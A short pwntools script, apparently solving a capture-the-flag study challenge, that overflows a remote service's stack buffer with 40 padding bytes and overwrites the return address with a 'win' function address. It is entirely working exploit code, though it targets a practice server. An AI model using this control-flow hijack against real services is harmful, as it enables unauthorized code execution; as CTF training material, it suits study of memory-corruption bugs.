from pwn import *

target = remote("pwn-study.katagaitai-ctf.com", 9020)

win_1 = 0x401490

payload = b"A" * 40
payload += p64(win_1)

target.sendline(payload)
print(target.recvall().decode())